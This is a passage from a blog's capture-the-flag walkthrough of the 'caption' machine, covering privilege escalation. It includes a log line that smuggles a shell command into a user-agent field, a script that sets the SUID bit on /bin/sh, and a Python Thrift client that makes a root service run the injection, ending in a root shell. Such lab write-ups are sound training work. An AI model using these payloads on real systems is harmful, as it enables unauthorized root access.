+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">margo@caption:~$ <span class="built_in">echo</span> <span class="string">&#x27;127.0.0.1 &quot;user-agent&quot;:&quot;&quot;; /bin/bash /tmp/nutzh.sh #&quot;&#x27;</span> &gt; /tmp/devil.log</span><br></pre></td></tr></table></figure>
+<p>The ‘#’ at the end is used to comment out any trailing characters that might<br>interfere with our command.<br>The files gonna look like this :</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">margo@caption:/tmp$ <span class="built_in">cat</span> Devil.<span class="built_in">log</span></span><br><span class="line"></span><br><span class="line">127.0.0.1 <span class="string">&quot;user-agent&quot;</span>:<span class="string">&quot;&quot;</span>; /bin/bash /tmp/nutzh.sh <span class="comment">#&quot;</span></span><br><span class="line"></span><br><span class="line">margo@caption:/tmp$ <span class="built_in">cat</span> nutzh.sh</span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> +s /bin/sh</span><br></pre></td></tr></table></figure>
+<p>We also make the script executable:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">margo@caption:/tmp$ <span class="built_in">chmod</span> +x nutzh.sh</span><br></pre></td></tr></table></figure>
+<p>To interact with the Thrift service, we need to install the thrift library and<br>generate the client code from the Thrift IDL file.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install thrift</span><br></pre></td></tr></table></figure>
+<p>Next, create a Thrift IDL file (log_service.thrift) that defines the service<br>interface:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&#x27;namespace go log_service</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> service LogService &#123;</span></span><br><span class="line"><span class="string">    string ReadLogFile(1: string filePath)</span></span><br><span class="line"><span class="string"> &#125;&#x27;</span> &gt; log_service.thrift</span><br></pre></td></tr></table></figure>
+<p>Generate the Python client code from the Thrift IDL file:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">thrift -gen py log_service.thrift</span><br></pre></td></tr></table></figure>
+<p>This will create a gen-py directory containing the client code.<br>We now write a Python script that will interact with the Thrift service and<br>trigger the command injection vulnerability.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">from thrift import Thrift</span><br><span class="line">from thrift.transport import TSocket</span><br><span class="line">from thrift.transport import TTransport</span><br><span class="line">from thrift.protocol import TBinaryProtocol</span><br><span class="line">from log_service import LogService  <span class="comment"># Import generated Thrift client code</span></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    <span class="comment"># Set up a transport to the server</span></span><br><span class="line">    transport = TSocket.TSocket(<span class="string">&#x27;localhost&#x27;</span>, 9090)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Buffering for performance</span></span><br><span class="line">    transport = TTransport.TBufferedTransport(transport)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Using a binary protocol</span></span><br><span class="line">    protocol = TBinaryProtocol.TBinaryProtocol(transport)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Create a client to use the service</span></span><br><span class="line">    client = LogService.Client(protocol)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Open the connection</span></span><br><span class="line">    transport.open()</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        <span class="comment"># Specify the log file path to process</span></span><br><span class="line">        log_file_path = <span class="string">&quot;/tmp/devil.log&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Call the remote method ReadLogFile and get the result</span></span><br><span class="line">        response = client.ReadLogFile(log_file_path)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Server response:&quot;</span>, response)</span><br><span class="line">    </span><br><span class="line">    except Thrift.TException as tx:</span><br><span class="line">        <span class="built_in">print</span>(f<span class="string">&quot;Thrift exception: &#123;tx&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Close the transport</span></span><br><span class="line">    transport.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p>Move this script to the gen-py directory and run it: </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python script.py</span><br><span class="line">Server response: Log file processed</span><br></pre></td></tr></table></figure>
+<p>We can now escalate our privileges by running &#x2F;bin&#x2F;sh with the -p option,<br>which preserves the effective user ID:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ margo@caption:/tmp$ /bin/sh -p</span><br><span class="line"> <span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+<pre><code>                                                GG!🎉
+</code></pre>
+<p>key takeaway:</p>
+<p><strong>Enumeration is Critical</strong>:manual inspection of services (e.g., GitBucket) are<br>essential for identifying attack vectors.</p>
+<p><strong>Header Injection</strong>: Always test for header vulnerabilities (e.g., X-Forwarded-<br>Host) when dealing with web applications.</p>
+<p><strong>Directory Traversal</strong>: Exploiting file read vulnerabilities can lead to creden-<br>tial theft (e.g., SSH keys).</p>
+<p><strong>Command Injection</strong>: Improper input sanitization in logging mechanisms can<br>lead to privilege escalation.</p>
+<p><strong>Thrift Exploitation</strong>: Understanding how to interact with services like Thrift<br>can unlock advanced exploitation techniques.</p>
+
+</article>
+    
+    
+
+</div>
+<div class="trm-post-next-prev row">
+    <div class="col-lg-12">
+        <!-- title -->
+        <h5 class="trm-title-with-divider">
+            Other Articles
+            <span data-number="02"></span>
+        </h5>
+    </div>
+    
+    
+        <div class="col-lg-6">
+    <div class="trm-blog-card trm-scroll-animation">
+        <a href="/Mrrobot/" class="trm-cover-frame trm-anima-link">
+            
+            
+                <img alt="cover" class="no-fancybox" src="https://wallpapercat.com/w/full/e/8/4/22100-3840x2160-desktop-4k-mr-robot-background-image.jpg">
+            
+        </a>
+        
+        <div class="trm-card-descr">
+            <div class="trm-label trm-category trm-mb-20">
+                <a href=" /categories/TRY-HACK-ME/">
+                    TRY HACK ME
+                </a>
+            </div>
+            <h5>
+                <a href="/Mrrobot/" class="trm-anima-link">
+                    Mrrobot
+                </a>
+            </h5>
+            <div class="trm-divider trm-mb-20 trm-mt-20"></div>
+            <ul class="trm-card-data trm-label">
+                <li>25/01/14</li>
+                <li>15:50</li>
+                
+                    <li>925</li>
+                
+                
+                    <li>5</li>
+                
+            </ul>
+        </div>
+    </div>
+</div>
+    
+</div>
+
+    
+
+
+
+                    <div class="trm-divider footer-divider"></div>
+
+                    <!-- footer -->
+                    <footer class="trm-footer-card trm-scroll-animation">
+
+    
+
+    
+        <div class="trm-footer-item">
+            <span>© 2024 - 2025</span>
+            <span class="footer-separator"data-separator=" · "></span>
+            <span class="trm-accent-color">NUTZH</span>
+        </div>
+    
+
+      
+
+     
+
+    
+        <div class="trm-footer-item">
+            Keep learning,<br> keep growing,<br> keep moving forward.
+        </div>
+     
+</footer>
+
+<!-- Add Mario here -->
+<div class="mario">
+    <img src="/images/mario-bros.gif" alt="Mario" />
+    <div class="speech-bubble">
+       Hi <br>It's-a me, Mario! 🍄 
+    </div>
+</div>
+
+<!-- Custom CSS -->
+<style>
+    @media screen and (max-width: 1486px) {
+        .mario {
+            display: none; /* Hide Mario on small screens */
+        }
+    }
+    .mario {
+        position: fixed; /* Fix Mario to the screen */
+        left: 10px; /* Position it 20px from the left edge */
+        bottom: 20px; /* Position it 20px from the bottom edge */
+        cursor: pointer; /* Make it interactive */
+        z-index: 1000; /* Ensure it stays on top of other elements */
+        animation: float 3s ease-in-out infinite; /* Add a floating animation */
+    }
+
+    .mario img {
+        width: 160px; /* Adjust the size of the image (smaller) */
+        height: auto; /* Maintain aspect ratio */
+        transition: transform 0.3s ease; /* Add a smooth animation */
+    }
+
+    .mario:hover img {
+        transform: scale(1.2); /* Make Mario grow on hover */
+    }
+
+    /* Speech bubble */
+    .speech-bubble {
+    position: absolute;
+    bottom: 100%; /* Position the bubble above Mario */
+    left: 100%; /* Center the bubble horizontally */
+    transform: translateX(-50%); /* Adjust for centering */
+    background-color: #fff; /* White background */
+    color: #000; /* Black text */
+    padding: 9px; /* Increase padding to make the bubble bigger */
+    border-radius: 10px;
+    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2); /* Add a shadow */
+    font-size: 1.0rem; /* Increase font size */
+    text-align: center;
+    opacity: 0; /* Hide the bubble by default */
+    visibility: hidden; /* Hide the bubble by default */
+    transition: opacity 0.3s ease, visibility 0.3s ease; /* Smooth transition */
+    white-space: nowrap; /* Prevent text from wrapping */
+}
+
+/* Show the speech bubble on hover or click */
+.mario:hover .speech-bubble,
+.mario:active .speech-bubble {
+    opacity: 1; /* Show the bubble */
+    visibility: visible; /* Show the bubble */
+}
+    /* Floating animation */
+    @keyframes float {
+        0%, 100% {
+            transform: translateY(0); /* Start and end at the same position */
+        }
+        50% {
+            transform: translateY(-10px); /* Move Mario up */
+        }
+    }
+</style>
+                    <!-- footer end -->
+
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+            <!-- body end -->
+
+            
+
+    <div id="post-toc" class="trm-post-toc">
+      <div class="trm-post-toc-header">
+        Article table of contents
+				<span id="post-toc-top">
+					TOP
+				</span>
+      </div>
+      <div class="trm-post-toc-content">
+        <ol class="trm-toc"><li class="trm-toc-item trm-toc-level-2" title="Table of Contents"><a rel="nofollow" class="trm-toc-link" href="#Table-of-Contents"><span class="trm-toc-number">1.</span> <span class="trm-toc-text">Table of Contents</span></a></li><li class="trm-toc-item trm-toc-level-2" title="Enumeration with Nmap"><a rel="nofollow" class="trm-toc-link" href="#Enumeration-with-Nmap"><span class="trm-toc-number">2.</span> <span class="trm-toc-text">Enumeration with Nmap</span></a><ol class="trm-toc-child"><li class="trm-toc-item trm-toc-level-3" title="Vulnerability Discovery:"><a rel="nofollow" class="trm-toc-link" href="#Vulnerability-Discovery"><span class="trm-toc-number">2.1.</span> <span class="trm-toc-text">Vulnerability Discovery:</span></a></li></ol></li><li class="trm-toc-item trm-toc-level-2" title="Bypassing the &#x2F;logs Directory"><a rel="nofollow" class="trm-toc-link" href="#Bypassing-the-logs-Directory"><span class="trm-toc-number">3.</span> <span class="trm-toc-text">Bypassing the &#x2F;logs Directory</span></a></li><li class="trm-toc-item trm-toc-level-2" title="foothhold"><a rel="nofollow" class="trm-toc-link" href="#foothhold"><span class="trm-toc-number">4.</span> <span class="trm-toc-text">foothhold</span></a></li><li class="trm-toc-item trm-toc-level-2" title="Privilege Escalation"><a rel="nofollow" class="trm-toc-link" href="#Privilege-Escalation"><span class="trm-toc-number">5.</span> <span class="trm-toc-text">Privilege Escalation</span></a><ol class="trm-toc-child"><li class="trm-toc-item trm-toc-level-3" title="Vulnerability Discovery:"><a rel="nofollow" class="trm-toc-link" href="#Vulnerability-Discovery-1"><span class="trm-toc-number">5.1.</span> <span class="trm-toc-text">Vulnerability Discovery:</span></a></li></ol></li></ol>
+      </div>
+    </div>
+
+            
+<div class="trm-fixed-container">
+    
+        <div class="trm-fixed-btn post-toc-btn" data-title="Open toc">
+            <i class="iconfont fas fa-th-list"></i>
+        </div>
+    
+    
+        <div class="trm-fixed-btn" data-title="Read Mode" onclick="asyncFun.switchReadMode()">
+            <i class="iconfont fas fa-book-reader"></i>
+        </div>
+    
+    
+        <div class="trm-fixed-btn hidden-md" data-title="Toggle between single-column and double-column" onclick="asyncFun.switchSingleColumn()">
+            <i class="iconfont fas fa-arrows-alt-h"></i>
+        </div>
+    
+    <div id="trm-back-top" class="trm-fixed-btn" data-title="Back To Top">
+        <i class="iconfont fas fa-arrow-up"></i>
+    </div>
+</div>
+        </div>
+      </div>
+      <!-- scroll container end -->
+  </div>
+  <!-- app wrapper end -->
+
+  
+    <div class="trm-search-popup">
+        <div class="trm-search-wrapper">
+            <div class="form trm-search-form">
+                <div class="trm-search-input-icon">
+                    <i class="iconfont fas fa-search"></i>
+                </div>
+                <input class="trm-search-input" type="text" placeholder="Searching...">
+                <div class="trm-search-btn-close">
+                    <i class="iconfont fas fa-times"></i>
+                </div>
+            </div>
+            <div class="trm-search-result-container">
+                <div class="trm-search-empty">
+                    Please enter keywords to search
+                </div>
+            </div>
+            <div class="trm-search-footer">
+                <div class="trm-search-stats"></div>
+                <ul class="trm-search-commands">
+                    <li>
+                        <kbd class="command-palette-commands-key">
+                            <svg width="15" height="15" aria-label="Escape key" role="img">
+                                <g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"
+                                    stroke-width="1.2">
+                                    <path
+                                        d="M13.6167 8.936c-.1065.3583-.6883.962-1.4875.962-.7993 0-1.653-.9165-1.653-2.1258v-.5678c0-1.2548.7896-2.1016 1.653-2.1016.8634 0 1.3601.4778 1.4875 1.0724M9 6c-.1352-.4735-.7506-.9219-1.46-.8972-.7092.0246-1.344.57-1.344 1.2166s.4198.8812 1.3445.9805C8.465 7.3992 8.968 7.9337 9 8.5c.032.5663-.454 1.398-1.4595 1.398C6.6593 9.898 6 9 5.963 8.4851m-1.4748.5368c-.2635.5941-.8099.876-1.5443.876s-1.7073-.6248-1.7073-2.204v-.4603c0-1.0416.721-2.131 1.7073-2.131.9864 0 1.6425 1.031 1.5443 2.2492h-2.956">
+                                    </path>
+                                </g>
+                            </svg>
+                        </kbd>
+                        <span class="command-palette-Label">to close</span>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+  <!-- Plugin -->
+
+
+
+
+    
+    
+<script src="https://unpkg.com/@fancyapps/ui@4.0/dist/fancybox.umd.js"></script>
+
+    
+
+    
+        <script src="/js/plugins/typing.js?v=2.2.4"></script>
+    
+
+    
+        
+<script src="https://unpkg.com/hexo-generator-searchdb@1.4.0/dist/search.js"></script>
+
+        <script src="/js/plugins/local_search.js?v=2.2.4"></script>
+    
+
+    <!--  -->
+    
+
+    <!--  -->
+    
+        
+
+        
+    
+
+		
+
+
+
+
+    <!-- Service Worker -->
+    
+    <!-- baidu push -->
+    
+
+
+<script id="async-script" src="/js/main.js?v=2.2.4"></script>
+
+<!-- CDN -->
+
+
+    
+
+    
+
+    
+
+
+
+</body>
+
+</html>
